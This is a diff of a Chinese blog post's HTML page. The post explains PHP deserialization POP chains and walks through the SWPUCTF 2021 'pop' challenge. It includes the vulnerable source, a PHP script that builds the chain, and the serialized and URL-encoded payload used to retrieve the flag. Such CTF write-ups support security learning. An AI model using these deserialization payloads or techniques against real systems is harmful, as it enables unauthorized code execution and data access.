@@ -17,12 +17,12 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="pop链构造在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危">
+    <meta name="description" content="pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pop链构造">
 <meta property="og:url" content="https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="pop链构造在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危">
+<meta property="og:description" content="pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-02-19T08:41:25.000Z">
 <meta property="article:modified_time" content="2026-02-19T13:36:54.323Z">
@@ -140,7 +140,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text">pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eg-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="toc-number">1.1.</span> <span class="toc-text">eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text"> pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#egswpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-number">1.1.</span> <span class="toc-text"> eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -216,7 +216,8 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h1><p>在PHP反序列化漏洞利用中，<strong>POP链（Property Oriented Programming Chain）</strong> 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：<strong>找到入口 → 确定尾巴 → 构建中间桥梁</strong>。</p>
+        <h1 id="pop链构造"><a class="markdownIt-Anchor" href="#pop链构造"></a> pop链构造</h1>
+<p>在PHP反序列化漏洞利用中，<strong>POP链（Property Oriented Programming Chain）</strong> 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：<strong>找到入口 → 确定尾巴 → 构建中间桥梁</strong>。</p>
 <p><strong>1. 明确入口与尾巴</strong></p>
 <ul>
 <li><strong>入口</strong>：常见为 <em>__wakeup()</em>、<em>__destruct()</em> 等在反序列化或对象销毁时自动调用的方法。</li>
@@ -225,17 +226,22 @@
 </ul>
 <p><strong>2. 利用魔术方法串联</strong> 常用魔术方法及触发条件：</p>
 <ul>
-<li><p><em>__get()</em>：访问不可访问属性时触发。</p>
+<li>
+<p><em>__get()</em>：访问不可访问属性时触发。</p>
 </li>
-<li><p><em>__set()</em>：给不可访问属性赋值时触发。</p>
+<li>
+<p><em>__set()</em>：给不可访问属性赋值时触发。</p>
 </li>
-<li><p><em>__call()</em>：调用不存在方法时触发。</p>
+<li>
+<p><em>__call()</em>：调用不存在方法时触发。</p>
 </li>
-<li><p><em>__tostring()</em>：对象被当作字符串使用时触发。</p>
+<li>
+<p><em>__tostring()</em>：对象被当作字符串使用时触发。</p>
 </li>
-<li><p><em>__invoke()</em>：对象被当作函数调用时触发。</p>
+<li>
+<p><em>__invoke()</em>：对象被当作函数调用时触发。</p>
 <p>总之就是</p>
-<p>   1.寻找可利用的魔术方法作为起点，也就是说链头特征是能够被输入内容的并且能被用户所控制的；</p>
+<p>1.寻找可利用的魔术方法作为起点，也就是说链头特征是能够被输入内容的并且能被用户所控制的；</p>
 <ol start="2">
 <li>构建方法调用链，连接起点和终点；</li>
 <li>找到危险函数或操作作为终点，也就是说链尾特征是可以读取文件或者能够执行命令的；</li>
@@ -243,9 +249,9 @@
 </ol>
 </li>
 </ul>
-<h3 id="eg-SWPUCTF-2021-新生赛-pop"><a href="#eg-SWPUCTF-2021-新生赛-pop" class="headerlink" title="eg.[SWPUCTF 2021 新生赛]pop"></a>eg.[SWPUCTF 2021 新生赛]pop</h3><p>代码如下：</p>
+<h3 id="egswpuctf-2021-新生赛pop"><a class="markdownIt-Anchor" href="#egswpuctf-2021-新生赛pop"></a> eg.[SWPUCTF 2021 新生赛]pop</h3>
+<p>代码如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
 <p>我们来进行简单分析：</p>
 <p>1.对于w44m类;</p>
 <p>如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,</p>
@@ -262,26 +268,20 @@
 <li>而如何调用w33m类中的__toString()方法呢，我们看到w22m类中有<code>echo $this-&gt;w00m;</code>，需要给w00m一个w33m类即可</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w22m::__destruct()-&gt;w33m::__toString()-&gt;w44m::Getflag()</span><br></pre></td></tr></table></figure>
-
-
-
 <p>接着，我们再尝试构造payload：</p>
-<p>1、首先复制源码到编辑器中<br>将不需要的部分注释掉(和赋值无关的都注释掉)</p>
+<p>1、首先复制源码到编辑器中<br />
+将不需要的部分注释掉(和赋值无关的都注释掉)</p>
 <p>以下是删除注释后的剩余部分：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、添加pop链和序列化代码<br>根据前面我们的分析，从pop链的链尾开始赋值<br>私有和保护属性，采用内部赋值；</p>
+<p>2、添加pop链和序列化代码<br />
+根据前面我们的分析，从pop链的链尾开始赋值<br />
+私有和保护属性，采用内部赋值；</p>
 <p>对象赋值采用外部赋值：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a=new w44m();// 创建w44m对象</span><br><span class="line">// 这里$a的属性还没有赋值，保持默认值</span><br><span class="line"></span><br><span class="line">$b=new w33m();</span><br><span class="line">$b-&gt;w00m=$a;//外部赋值：给public属性$w00m赋值</span><br><span class="line">$b-&gt;w22m=Getflag;//外部赋值：给public属性$w22m赋值</span><br><span class="line"></span><br><span class="line">$t=new w22m();</span><br><span class="line">$t-&gt;w00m=$b;</span><br><span class="line">echo serialize($t);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo urlencode(serialize($t));</span><br></pre></td></tr></table></figure>
-
 <p>构造得：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;\00w44m\00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;\00*\00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>URL编码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-
 <p>然后得到flag。</p>
 
     </div>
@@ -333,7 +333,7 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/covers/hoshimi-miyabi-5k-3840x2160-20293.jpg" data-sizes="auto" alt="CRT" class="lazyload">
+            <img data-src="/covers/preview.jpg" data-sizes="auto" alt="CRT" class="lazyload">
         <a href="/2026/02/24/CRT/" aria-label="Prev: CRT" title="Prev: CRT"></a>
         <div class="article-nav-caption">Prev</div>
         <h3 class="article-nav-title">
@@ -341,7 +341,7 @@
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/hoshimi-miyabi-dope-3840x2160-20500.jpg" data-sizes="auto" alt="RCE漏洞原理及利用" class="lazyload">
+          <img data-src="/covers/pd-image (1).png" data-sizes="auto" alt="RCE漏洞原理及利用" class="lazyload">
       <a href="/2026/02/15/RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" aria-label="Next: RCE漏洞原理及利用"  title="Next: RCE漏洞原理及利用"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
@@ -390,10 +390,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        21.8k
+        22k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        01:40
+        01:41
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -415,7 +415,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text">pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eg-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="toc-number">1.1.</span> <span class="toc-text">eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text"> pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#egswpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-number">1.1.</span> <span class="toc-text"> eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -546,7 +546,7 @@
           url: "https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/",
           excerpt: "",
           description: "",
-          stripContent: "pop链构造在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危险函数的代码位置，如 eval()、system()、file_put_contents()、inc",
+          stripContent: " pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危险函数的代码位置，如 eval()、system()、file_put_contents()、i",
           date: "Thu Feb 19 2026 16:41:25 GMT+0800",
           updated: "Thu Feb 19 2026 21:36:54 GMT+0800",
           cover: "/images/banner.webp",
